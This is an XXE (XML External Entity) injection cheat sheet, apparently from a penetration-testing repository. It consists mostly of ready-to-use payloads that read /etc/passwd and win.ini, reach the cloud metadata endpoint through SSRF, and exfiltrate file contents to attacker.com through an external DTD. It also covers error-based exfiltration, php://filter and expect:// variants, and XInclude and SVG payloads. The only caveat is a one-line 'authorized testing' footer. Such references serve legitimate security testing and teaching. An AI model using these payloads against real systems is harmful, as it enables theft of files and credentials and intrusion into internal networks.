# 📄 XXE - XML External Entity Injection

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   XML External Entity Injection
```

---

## 🎯 What is XXE

**XXE** exploits XML parsers that process external entity references, allowing file reading, SSRF, and in some cases RCE.

---

## 💉 Basic Payloads

### Read Local Files
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Windows Files
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

## 🔒 Blind XXE (Out-of-Band)

### External DTD
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd on attacker server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Error-Based Exfiltration
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

## 🛡️ Bypass Techniques

### Encoding
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Base64 wrapped -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Protocol Variants
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SVG XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

## 📊 Quick Reference

| Payload Type | Use Case |
|--------------|----------|
| File read | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| Blind (OOB) | External DTD + exfil |
| Error-based | Force error with data |

### Common Vulnerable Endpoints
```
- SOAP APIs
- XML file uploads
- SVG processors
- Document parsers (DOCX, XLSX)
- RSS/Atom feeds
```

---

## 📚 Resources

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 Exploit XML Parsers!</b><br>
  <i>For authorized testing only!</i>
</p>
